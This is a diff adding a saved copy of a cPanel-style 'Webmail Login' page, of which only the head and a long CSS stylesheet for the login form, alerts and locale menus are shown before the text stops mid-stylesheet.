@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<!-- saved from url=(0029)https://guide-level.com:2096/ -->
+<html lang="en" dir="ltr"><script src="chrome-extension://pgojnojmmhpofjgdmaebadhbocahppod/assets/inject/solvedCallback.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta name="google" content="notranslate">
+    <meta name="apple-itunes-app" content="app-id=1188352635">
+    <title>Webmail Login</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+
+  <style>
+    @font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Bold-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Bold-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Bold-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Bold-webfont.ttf) format('truetype'),url(OpenSans-Bold-webfont.svg#open_sansbold) format('svg');font-style:normal;font-weight:700}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-BoldItalic-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-BoldItalic-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-BoldItalic-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-BoldItalic-webfont.ttf) format('truetype'),url(OpenSans-BoldItalic-webfont.svg#open_sansbold_italic) format('svg');font-style:italic;font-weight:700}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBold-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBold-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBold-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBold-webfont.ttf) format('truetype'),url(OpenSans-ExtraBold-webfont.svg#open_sansextrabold) format('svg');font-style:normal;font-weight:800}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBoldItalic-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBoldItalic-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBoldItalic-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-ExtraBoldItalic-webfont.ttf) format('truetype'),url(OpenSans-ExtraBoldItalic-webfont.svg#open_sansextrabold_italic) format('svg');font-style:italic;font-weight:800}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Italic-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Italic-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Italic-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Italic-webfont.ttf) format('truetype'),url(OpenSans-Italic-webfont.svg#open_sansitalic) format('svg');font-style:italic;font-weight:400}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Light-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Light-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Light-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Light-webfont.ttf) format('truetype'),url(OpenSans-Light-webfont.svg#open_sanslight) format('svg');font-style:normal;font-weight:300}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-LightItalic-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-LightItalic-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-LightItalic-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-LightItalic-webfont.ttf) format('truetype'),url(OpenSans-LightItalic-webfont.svg#open_sanslight_italic) format('svg');font-style:italic;font-weight:300}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Regular-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Regular-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Regular-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Regular-webfont.ttf) format('truetype'),url(OpenSans-Regular-webfont.svg#open_sansregular) format('svg');font-weight:400;font-style:normal}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Semibold-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Semibold-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Semibold-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-Semibold-webfont.ttf) format('truetype'),url(OpenSans-Semibold-webfont.svg#open_sanssemibold) format('svg');font-style:normal;font-weight:600}@font-face{font-family:'Open Sans';src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-SemiboldItalic-webfont.eot);src:url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-SemiboldItalic-webfont.eot?#iefix) format('embedded-opentype'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-SemiboldItalic-webfont.woff) format('woff'),url(/cPanel_magic_revision_1648610195/unprotected/nc-cpanel/fonts/open_sans/OpenSans-SemiboldItalic-webfont.ttf) format('truetype'),url(OpenSans-SemiboldItalic-webfont.svg#open_sanssemibold_italic) format('svg');font-style:italic;font-weight:600}
+    @font-face {
+  font-family: 'Museo Sans 300';
+  src: url(fonts/museo-sans-300-webfont.eot);
+  src: url(fonts/museo-sans-300-webfont.eot?#iefix) format('embedded-opentype'), url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-300-webfont.woff) format('woff'), url(fonts/museo-sans-300-webfont.ttf) format('truetype'), url(fonts/museo-sans-300-webfont.svg#museo-sans-300-webfont) format('svg');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'Museo Sans 500';
+  src: url(fonts/museo-sans-500-webfont.eot);
+  src: url(fonts/museo-sans-500-webfont.eot?#iefix) format('embedded-opentype'), url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-500-webfont.woff) format('woff'), url(fonts/museo-sans-500-webfont.ttf) format('truetype'), url(fonts/museo-sans-500-webfont.svg#museo-sans-500-webfont) format('svg');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'Museo Sans 700';
+  src: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-700-webfont.eot);
+  src: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-700-webfont.eot?#iefix) format('embedded-opentype'), url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-700-webfont.woff) format('woff'), url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/fonts/museo-sans-700-webfont.ttf) format('truetype'), url(fonts/museo-sans-700-webfont.svg#museo-sans-700-webfont) format('svg');
+  font-weight: bold;
+  font-style: normal;
+}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+img {
+  max-width: 100%;
+}
+input {
+  text-transform: none;
+  overflow: visible;
+}
+a {
+  color: #de3723;
+  text-decoration: none;
+}
+ul,
+ol {
+  list-style-type: none;
+}
+body {
+  font-family: 'Museo Sans 500', Arial, Helvetica, sans-serif;
+  font-size: 16px;
+  padding: 0;
+  margin: 0;
+  color: #6d6e70;
+}
+
+.IE-warning-hide {
+  display: none;
+}
+
+.mb-32 {
+  margin-bottom: 32px;
+}
+.mt-32 {
+  margin-top: 32px;
+}
+.btn,
+.input-button {
+  display: inline-block;
+  height: 38px;
+  padding: 0 16px;
+  border: 1px solid;
+  border-radius: 5px;
+  font-family: 'Museo Sans 700';
+  font-size: 16px;
+  font-weight: bold;
+  line-height: 36px;
+  text-align: center;
+  white-space: nowrap;
+  cursor: pointer;
+  vertical-align: middle;
+  touch-action: manipulation;
+}
+.btn:hover,
+.input-button:hover {
+  text-decoration: none;
+}
+.btn:focus,
+.input-button:focus {
+  border-color: #97cbf4;
+  outline: none;
+  box-shadow: 0 0 8px #97cbf4;
+}
+.btn[disabled],
+.input-button[disabled] {
+  cursor: not-allowed;
+  opacity: 0.65;
+}
+.btn--red,
+.input-button--red {
+  border-color: #e0452f;
+  background: #f14c2e -webkit-gradient(linear, left top, left bottom, from(#f14c2e), to(#d8452e));
+  background: #f14c2e linear-gradient(#f14c2e, #d8452e);
+  color: #fff;
+  text-shadow: 0 -1px 1px #d8452e;
+}
+.btn--green,
+.input-button--green {
+  border-color: #6c9494;
+  background: #8cc1c1 -webkit-gradient(linear, left top, left bottom, from(#8cc1c1), to(#6d9796));
+  background: #8cc1c1 linear-gradient(#8cc1c1, #6d9796);
+  color: #fff;
+  text-shadow: 0 -1px 1px #6d9796;
+}
+.btn--large,
+.input-button--large {
+  height: 48px;
+  font-size: 1.125rem;
+  line-height: 46px;
+}
+.btn--block,
+.input-button--block {
+  width: 100%;
+  display: block;
+}
+.btn--link,
+.input-button--link {
+  border-radius: 0;
+  border-color: transparent;
+  background: none;
+  color: #de3723;
+  font-family: 'Museo Sans 500';
+  font-weight: normal;
+  padding: 0 8px;
+}
+.btn--link:not([disabled]):hover,
+.input-button--link:not([disabled]):hover,
+.btn--link:not([disabled]):active,
+.input-button--link:not([disabled]):active {
+  background: none;
+}
+.btn--link:not([disabled]):hover,
+.input-button--link:not([disabled]):hover {
+  text-decoration: underline;
+}
+.input-button {
+  border-color: #e0452f;
+  background: #f14c2e -webkit-gradient(linear, left top, left bottom, from(#f14c2e), to(#d8452e));
+  background: #f14c2e linear-gradient(#f14c2e, #d8452e);
+  color: #fff;
+  text-shadow: 0 -1px 1px #d8452e;
+  height: 48px;
+  font-size: 1.125rem;
+  line-height: 46px;
+  width: 100%;
+  display: block;
+}
+.form-control,
+.std_textbox {
+  display: block;
+  width: 100%;
+  max-width: 100%;
+  height: 38px;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  padding: 6px 8px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  background-color: #fff;
+  color: #6d6e70;
+  font-family: "Museo Sans 500";
+  font-size: 1rem;
+  font-weight: 300;
+  line-height: 1.5;
+}
+.form-control::placeholder,
+.std_textbox::placeholder {
+  color: #a0a1a3;
+}
+.form-control:focus,
+.std_textbox:focus {
+  border-color: #75b9f0;
+  outline: none;
+  -webkit-box-shadow: 0 0 8px #97cbf4;
+  box-shadow: 0 0 8px #97cbf4;
+}
+.form-control[disabled],
+.std_textbox[disabled] {
+  cursor: not-allowed;
+  opacity: 0.5;
+}
+.form-control.is-error,
+.std_textbox.is-error {
+  border-color: #de3723;
+  color: #de3723;
+  background-color: #fceded;
+}
+.form-control.is-error ~ p,
+.std_textbox.is-error ~ p {
+  color: #de3723;
+}
+.copy-button span:before {
+  content: '';
+  position: absolute;
+  z-index: 9998;
+  bottom: -5px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 0;
+  height: 0;
+  border-left: 5px solid transparent;
+  border-right: 5px solid transparent;
+  border-top: 5px solid #6D6E70;
+}
+.copy-button span {
+  display: none;
+  position: absolute;
+  z-index: 9999;
+  bottom: 40px;
+  left: 50%;
+  width: auto;
+  transform: translateX(-50%);
+  padding: 8px;
+  color: #fff;
+  font-size: 16px;
+  line-height: 24px;
+  text-align: center;
+  white-space: nowrap;
+  background: #6D6E70;
+  border-radius: 5px;
+  cursor: auto;
+}
+.form-field {
+  position: relative;
+}
+.form-field--with-action .form-field__action {
+  background-color: transparent;
+  border: 0;
+  position: absolute;
+  top: 50%;
+  right: 12px;
+  transform: translateY(-50%);
+  width: 22px;
+  height: 22px;
+  cursor: pointer;
+  display: inline-block;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+.form-field--with-action .form-field__action:focus {
+  outline: none;
+}
+.form-field--with-action .form-field__action--copy-pass {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/copy-to-colipboard.svg);
+  right: 48px;
+}
+.form-field--with-action .form-field__action--copy-pass:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.form-field--with-action .form-field__action--success-icon {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/success-full.svg);
+  right: 48px;
+  cursor: default;
+  visibility: hidden;
+}
+.form-field--with-action .form-control {
+  padding-right: 36px;
+}
+.form-field--with-action .form-control::-ms-clear,
+.form-field--with-action .form-control::-ms-reveal {
+  display: none;
+}
+.form-field--with-action .form-control[type="text"] ~ .form-field__action--toggle-pass {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/eye-closed.svg);
+}
+.form-field--with-action .form-control[type="password"] ~ .form-field__action--toggle-pass {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/eye-open.svg);
+}
+.tooltip {
+  display: inline-block;
+  cursor: pointer;
+  position: relative;
+  vertical-align: bottom;
+}
+.tooltip:hover .tooltip__wrap {
+  display: block;
+}
+.tooltip--small .tooltip__toggle--icon {
+  width: 14px;
+  height: 14px;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/tooltip-full.svg);
+}
+.tooltip__toggle--icon {
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  color: transparent;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/help.svg);
+}
+.tooltip__wrap {
+  display: none;
+  position: absolute;
+  bottom: calc(100% + 10px);
+  left: 50%;
+  padding: 6px;
+  text-align: left;
+  cursor: auto;
+  z-index: 1;
+  transform: translate(-50%, 0);
+}
+@media (min-width: 768px) {
+  .tooltip__wrap {
+    bottom: 50%;
+    left: calc(100% + 10px);
+    transform: translate(0, 50%);
+  }
+}
+.tooltip__wrap p:last-child {
+  margin: 0;
+}
+.tooltip__arrow {
+  position: absolute;
+  bottom: 0;
+  left: 50%;
+  width: 12px;
+  height: 12px;
+  transform: translate(-50%, 0) rotate(45deg);
+  background: #6D6E70;
+}
+@media (min-width: 768px) {
+  .tooltip__arrow {
+    bottom: 50%;
+    left: 0;
+    transform: translate(0, 50%) rotate(45deg);
+  }
+}
+.tooltip__content {
+  display: inline-block;
+  width: 260px;
+  padding: 24px 28px;
+  border-radius: 5px;
+  background: #6D6E70;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 500;
+  font-family: 'Museo Sans 300';
+  line-height: 1.5;
+  text-transform: none;
+  box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+}
+.alert {
+  position: relative;
+  padding: 18px;
+  border: 1px solid #b5b5b5;
+  color: #6d6e70;
+  max-width: 530px;
+  margin: 0 auto 16px;
+  font-family: 'Museo Sans 300';
+}
+.alert::after {
+  display: table;
+  clear: both;
+  content: "";
+}
+.alert--success,
+.alert--info,
+.alert--warning,
+.alert--danger,
+.alert.error-notice,
+.alert.warn-notice,
+.alert.success-notice,
+.alert.info-notice {
+  border-color: transparent;
+}
+.alert--success,
+.alert.success-notice {
+  background: #d1e6e6;
+}
+.alert--info,
+.alert.info-notice {
+  background: #e5e5e5;
+}
+.alert--danger,
+.alert.error-notice,
+.alert--warning,
+.alert.warn-notice {
+  background: #f8e3e3;
+}
+.alert--dismissible {
+  padding-right: 36px;
+}
+.alert__close {
+  margin-left: 8px;
+  float: right;
+  font-size: 0;
+  line-height: 0;
+  cursor: pointer;
+  width: 16px;
+  height: 16px;
+}
+.alert .gb-icon {
+  margin-right: 2px;
+  float: left;
+  font-size: 20px;
+}
+.alert__content {
+  overflow: hidden;
+}
+.alert p {
+  margin: 0;
+  line-height: 24px;
+}
+.alerts-sticky {
+  position: fixed;
+  top: 0;
+  left: 50%;
+  width: 100vw;
+  max-width: 100%;
+  padding: 8px 16px;
+  transform: translateX(-50%);
+  z-index: 2;
+  margin-bottom: 8px;
+}
+@media (min-width: 768px) {
+  .alerts-sticky {
+    width: 75%;
+  }
+}
+@media (min-width: 1200px) {
+  .alerts-sticky {
+    width: 50%;
+  }
+}
+.alerts-sticky .alert {
+  color: #6d6e70;
+  font-size: 14px;
+  font-weight: bold;
+  font-family: 'Museo Sans 700';
+  box-shadow: 3px 3px 0 0 rgba(0, 0, 0, 0.1);
+}
+.alerts-sticky .alert .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close.svg);
+}
+.alerts-sticky .alert--success,
+.alerts-sticky .alert.success-notice {
+  border-color: #9fcbcb;
+  color: #3c763d;
+}
+.alerts-sticky .alert--success .alert__close,
+.alerts-sticky .alert.success-notice .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close-success.svg);
+}
+.alerts-sticky .alert--success .alert__content,
+.alerts-sticky .alert.success-notice .alert__content {
+  padding-left: 26px;
+  position: relative;
+}
+.alerts-sticky .alert--success .alert__content::before,
+.alerts-sticky .alert.success-notice .alert__content::before {
+  content: "";
+  position: absolute;
+  left: 0;
+  width: 16px;
+  height: 16px;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/checkmark-icon.svg);
+}
+.alerts-sticky .alert--success .alert__content p,
+.alerts-sticky .alert.success-notice .alert__content p {
+  display: inline-block;
+}
+.alerts-sticky .alert--danger,
+.alerts-sticky .alert.error-notice,
+.alerts-sticky .alert--warning,
+.alerts-sticky .alert.warn-notice {
+  border-color: #e9a6a6;
+}
+.alerts-sticky .alert--danger .alert__close,
+.alerts-sticky .alert.error-notice .alert__close,
+.alerts-sticky .alert--warning .alert__close,
+.alerts-sticky .alert.warn-notice .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close-danger.svg);
+}
+.alerts {
+  padding-bottom: 8px;
+}
+.alerts .alert {
+  color: #6d6e70;
+  font-size: 14px;
+  font-weight: bold;
+}
+.alerts .alert .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close.svg);
+  display: none;
+}
+.alerts .alert--success,
+.alerts .alert.success-notice {
+  border: 2px solid #9fcbcb;
+  color: #3c763d;
+  box-shadow: 3px 3px 0 0 rgba(0, 0, 0, 0.1);
+  font-family: 'Museo Sans 700';
+}
+.alerts .alert--success .alert__close,
+.alerts .alert.success-notice .alert__close {
+  display: block;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close-success.svg);
+}
+.alerts .alert--success .alert__content,
+.alerts .alert.success-notice .alert__content {
+  padding-left: 26px;
+  position: relative;
+}
+.alerts .alert--success .alert__content::before,
+.alerts .alert.success-notice .alert__content::before {
+  content: "";
+  position: absolute;
+  left: 0;
+  width: 16px;
+  height: 16px;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/checkmark-icon.svg);
+}
+.alerts .alert--success .alert__content p,
+.alerts .alert.success-notice .alert__content p {
+  display: inline-block;
+}
+.alerts .alert--warning .alert__close,
+.alerts .alert.warn-notice .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close-warning.svg);
+  display: none;
+}
+.alerts .alert--danger .alert__close,
+.alerts .alert.error-notice .alert__close {
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/close-danger.svg);
+  display: none;
+}
+#login-wrapper {
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  min-height: 100vh;
+}
+#login-wrapper .wrapper {
+  height: 100%;
+  flex-grow: 2;
+  display: flex;
+  flex-direction: column;
+}
+#content-container {
+  flex-grow: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+.login-container {
+  flex-grow: 2;
+  max-width: 600px;
+  width: 100%;
+  padding: 100px 0 80px;
+}
+.login-container__header {
+  width: 190px;
+  margin: 0 auto 40px;
+}
+.login-container__main {
+  border: 1px solid #d6d6d6;
+  border-radius: 8px;
+  padding: 32px 40px;
+  width: 100%;
+}
+.login-container__title,
+.login-container .label--title {
+  font-size: 20px;
+  color: #6d6e70;
+  margin-bottom: 12px;
+  font-family: 'Museo Sans 700';
+}
+.login-form__label {
+  color: #6d6e70;
+  font-weight: normal;
+  margin-bottom: 8px;
+  font-family: 'Museo Sans 500';
+}
+.login-form__messages .login-form__remark {
+  display: none;
+  color: #de3723;
+  margin: 8px 0 0 8px;
+}
+.login-form__remark {
+  font-size: 12px;
+  margin: 8px 0 24px;
+  font-weight: 300;
+  font-family: 'Museo Sans 300';
+}
+.login-form__remark--is-error {
+  color: #de3723;
+}
+.login-form__controls,
+.login-form .controls {
+  margin-top: 40px;
+  text-align: center;
+}
+.login-form__reset-pass {
+  margin-top: 16px;
+}
+.login-form__back-link {
+  font-size: 20px;
+  color: #6D6E70;
+  padding-left: 32px;
+  position: relative;
+  font-family: 'Museo Sans 700';
+}
+.login-form__back-link:before {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 50%;
+  transform: translateY(-50%);
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/arrow-back.svg);
+  background-repeat: no-repeat;
+  background-size: cover;
+  width: 16px;
+  height: 16px;
+}
+.login-form__placeholder {
+  display: block;
+  font-size: 12px;
+  margin: 8px 0 0 8px;
+}
+.login-form__text {
+  line-height: 24px;
+  font-family: 'Museo Sans 300';
+}
+.login-form__text:first-of-type {
+  margin-top: 16px;
+}
+.login-form__text:last-of-type {
+  margin-bottom: 32px;
+}
+.login-form__text--with-icon {
+  position: relative;
+  padding-left: 30px;
+  font-size: 20px;
+  line-height: 30px;
+}
+.login-form__text--with-icon:before {
+  width: 20px;
+  height: 20px;
+  background-image: url(/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/./images/alert.svg);
+  background-repeat: no-repeat;
+  background-size: cover;
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+}
+.login-form__text b {
+  font-family: 'Museo Sans 700';
+}
+.login-form__small-link {
+  color: #8cc1c1;
+  font-size: 14px;
+  display: inline-block;
+  margin-top: 8px;
+}
+.promo-chat {
+  width: 100%;
+  background-color: #f2f2f2;
+  padding: 64px 0;
+  text-align: center;
+}
+@media (min-width: 768px) {
+  .promo-chat .grid-col {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+}
+.promo-chat .grid-col p {
+  font-size: 18px;
+}
+.promo-chat .grid-col p + p {
+  margin: 24px 0 0;
+}
+@media (min-width: 768px) {
+  .promo-chat .grid-col p + p {
+    margin: 0 0 0 32px;
+  }
+}
+#mobilelocalemenu {
+  font-size: 14px;
+  color: #333;
+  display: none;
+  margin-top: 10px;
+}
+body.whm #mobilelocalemenu {
+  color: #FFF;
+}
+#mobilelocalemenu a {
+  padding: 5px 8px;
+  background-color: #CCC;
+  border: 1px solid #333;
+  border-radius: 4px;
+  color: #333;
+}
+#locale-container {
+  z-index: 3;
+  margin: 0 auto;
+  width: 768px;
+  height: 245px;
+  background-attachment: scroll;
+  -khtml-border-radius: 4px;
+  border-radius: 4px;
+  position: relative;
+  padding: 3px;
+}
+#locale-inner-container {
+  background-color: #16262a;
+  -khtml-border-radius: 4px;
+  border-radius: 4px;
+}
+#locale-header {
+  width: 100%;
+  border-bottom: 1px solid #333;
+  height: 25px;
+  padding: 5px 0 5px 0;
+}
+.locale-head {
+  float: left;
+  font-size: 14px;
+  color: #fff;
+  padding: 7px 0 10px 10px;
+}
+.close {
+  float: right;
+  padding: 7px 10px 0 0;
+  position: relative;
+  top: -3px;
+}
+.close a {
+  font-weight: bold;
+  font-family: 'Museo Sans 700';
+  font-size: 10px;
+  color: #fff;
+}
+.close a:hover {
+  color: #ff6c2c;
+}
+html[dir=rtl] .locale-head {
+  float: right;
+  padding: 7px 10px 10px 0;
+}
+html[dir=rtl] .close {
+  float: left;
+  padding: 7px 0 0 10px;
+}
+.locale-cell {
+  float: left;
+  display: block;
+  width: 140px;
+  height: 40px;
+  padding: 10px 0 0 5px;
+  overflow: hidden;
+}
+html[dir=rtl] .locale-cell {
+  float: right;
+  padding: 10px 5px 0 0;
+}
+.scroller {
+  max-height: 320px;
+  min-height: 205px;
+  overflow-y: auto;
+  padding: 0 0 0 10px;
+}
+html[dir=rtl] .scroller {
+  padding: 0 10px 0 0;
+}
+.scroller a {
+  font-size: 14px;
+  color: #fff;
+  text-decoration: none;
+}
+.scroller a:hover {
+  color: #ff6c2c;
+}
+.locale-container ul {
+  margin: 0;
+  padding: 0;
+  text-align: center;
+}
+.locale-container ul li,
+html[dir=rtl] .locale-container ul li:first-child {
+  display: inline;
+  list-style: none;
+  margin-left: 34px;
+}
+.locale-container ul li:first-child,
+html[dir=rtl] .locale-container ul li:last-child {
+  margin-left: 0;
+}
+#morelocale {
+  color: #293a4a;
+  text-decoration: none;
+}
+#morelocale {
+  font-weight: bold;
+  font-family: 'Museo Sans 700';
+  font-size: 16px;
+}
+.locale-container ul li a {
+  color: #293a4a;
+  text-decoration: none;
+  font-size: 12px;
+  font-weight: 600;
+  font-family: 'Museo Sans 700';
+}
+.locale-container ul li a:hover,
+#morelocale:hover {
+  color: #d03f00;
+}
+.logo {
+  text-align: center;
+}
+.copyright {
+  background-color: #f2f2f2 !important;
+  background-position-y: 10px;
+  padding: 40px 0 45px;
+  margin-top: 0;
+  color: #3f4143;
+  font-family: verdana;
+  font-size: 7pt;
+  text-align: center;
+}
+#locale-footer {
+  width: 100%;
+  background-color: #f2f2f2;
+  border-top: 3px solid #fff;
+}
+#locale-footer .locale-container {
+  max-width: 1000px;
+  margin: 0 auto;
+}
+#locale-footer .locales_list {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-wrap: wrap;
+  padding: 50px 0 10px;
+}
+#locale-footer .locales_list li {
+  margin: 0 20px;
+}
+#locale-footer .locales_list li a {
+  color: #293a4a;
+  font-size: 12px;
+}
+.copyright {
+  padding-top: 70px;
